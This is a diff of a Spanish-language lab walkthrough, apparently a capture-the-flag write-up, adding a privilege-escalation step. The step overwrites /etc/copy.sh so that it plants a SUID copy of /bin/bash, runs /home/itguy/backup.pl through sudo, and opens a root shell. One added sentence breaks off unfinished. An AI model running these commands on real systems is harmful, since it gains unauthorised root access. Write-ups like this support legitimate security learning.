@@ -94,12 +94,21 @@ Vemos que dicho archivo se dirige a otro
 
 ![image](https://github.com/user-attachments/assets/e36b05ff-7c4f-44b6-b084-0409f2fb2d37)
 
-vamo s aver que tiene "copy.sh"
+vamos aver que tiene "copy.sh"
 
 ![image](https://github.com/user-attachments/assets/da95a934-c99e-4b39-8597-73b3d6532cc4)
 
+Gracias a esto podemos hacer una simple modificación una copia del /bin/bash y una 
 
+```
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /etc/copy.sh
 
+sudo /usr/bin/perl /home/itguy/backup.pl
+
+ls -la /tmp/bash
+
+/tmp/bash -p
+```
 
 
 
